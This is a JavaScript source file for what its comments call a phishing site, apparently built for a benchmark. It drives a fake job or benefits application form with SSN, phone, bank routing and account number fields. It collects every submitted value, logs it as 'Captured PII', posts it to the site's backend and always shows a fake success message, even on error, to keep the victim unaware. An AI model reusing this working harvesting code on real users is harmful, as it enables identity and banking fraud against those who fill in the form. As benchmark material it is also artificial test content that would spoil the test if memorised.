// Main JavaScript for Phishing Site

document.addEventListener('DOMContentLoaded', function() {
    // File upload handling
    const fileUpload = document.getElementById('fileUpload');
    if (fileUpload) {
        fileUpload.addEventListener('click', function() {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = '.pdf,.doc,.docx';
            input.click();

            input.addEventListener('change', function(e) {
                if (e.target.files.length > 0) {
                    const fileName = e.target.files[0].name;
                    fileUpload.innerHTML = `
                        <div class="file-upload-icon">✓</div>
                        <p class="file-upload-text">${fileName}</p>
                        <p class="form-hint">Click to change file</p>
                    `;
                }
            });
        });

        // Drag and drop
        fileUpload.addEventListener('dragover', function(e) {
            e.preventDefault();
            fileUpload.style.borderColor = '#1a73e8';
            fileUpload.style.backgroundColor = '#e8f0fe';
        });

        fileUpload.addEventListener('dragleave', function(e) {
            e.preventDefault();
            fileUpload.style.borderColor = '#dadce0';
            fileUpload.style.backgroundColor = '';
        });

        fileUpload.addEventListener('drop', function(e) {
            e.preventDefault();
            fileUpload.style.borderColor = '#dadce0';
            fileUpload.style.backgroundColor = '';

            if (e.dataTransfer.files.length > 0) {
                const fileName = e.dataTransfer.files[0].name;
                fileUpload.innerHTML = `
                    <div class="file-upload-icon">✓</div>
                    <p class="file-upload-text">${fileName}</p>
                    <p class="form-hint">Click to change file</p>
                `;
            }
        });
    }

    // Form submission handler (phishing form)
    const phishingForm = document.getElementById('phishingForm');
    if (phishingForm) {
        phishingForm.addEventListener('submit', function(e) {
            e.preventDefault();

            // Collect all form data - this is what the phishing attack captures
            const formData = new FormData(phishingForm);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });

            // Log the captured data (for benchmark analysis)
            console.log('=== PHISHING FORM SUBMISSION ===');
            console.log('Captured PII:', JSON.stringify(data, null, 2));
            console.log('================================');

            // Send to backend for logging
            fetch('/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(result => {
                // Show fake success message
                alert('Thank you! Your application has been submitted successfully. Our team will review your application and contact you within 3-5 business days.');

                // Log for benchmark
                console.log('Data successfully captured by phishing site');
            })
            .catch(error => {
                // Even on error, show success (realistic phishing behavior)
                alert('Thank you! Your application has been submitted successfully.');
                console.log('Submission error (data may still be captured):', error);
            });
        });
    }

    // SSN formatting
    const ssnInput = document.querySelector('input[name="ssn"]');
    if (ssnInput) {
        ssnInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 9) value = value.slice(0, 9);

            if (value.length > 5) {
                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5);
            } else if (value.length > 3) {
                value = value.slice(0, 3) + '-' + value.slice(3);
            }

            e.target.value = value;
        });
    }

    // Phone formatting
    const phoneInput = document.querySelector('input[name="phone"]');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 10) value = value.slice(0, 10);

            if (value.length > 6) {
                value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6);
            } else if (value.length > 3) {
                value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
            } else if (value.length > 0) {
                value = '(' + value;
            }

            e.target.value = value;
        });
    }

    // Routing number formatting (9 digits)
    const routingInput = document.querySelector('input[name="routingNumber"]');
    if (routingInput) {
        routingInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 9) value = value.slice(0, 9);
            e.target.value = value;
        });
    }

    // Account number formatting
    const accountInput = document.querySelector('input[name="accountNumber"]');
    if (accountInput) {
        accountInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 17) value = value.slice(0, 17);
            e.target.value = value;
        });
    }
});
